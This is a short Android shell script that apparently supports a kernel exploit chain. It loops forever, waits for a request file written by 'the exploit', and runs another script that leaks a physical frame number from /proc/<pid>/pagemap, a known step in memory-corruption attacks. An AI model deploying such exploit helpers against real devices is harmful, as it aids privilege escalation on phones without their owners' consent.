#!/system/bin/sh
# Long-lived PFN watcher (endless-loop version of pfnd.sh): as soon as the
# exploit writes g9_req.txt and g9_pfn.txt does not exist yet, run pfn.sh to
# emit the PFN from /proc/<pid>/pagemap.
L=/sdcard/Download/pfnd2.log
echo "pfnd2 up pid=$$ uid=$(id -u) $(date)" >> $L
while true; do
  if [ -f /sdcard/Download/g9_req.txt ] && [ ! -f /sdcard/Download/g9_pfn.txt ]; then
    /system/bin/sh /sdcard/Download/pfn.sh
  fi
  sleep 1
done
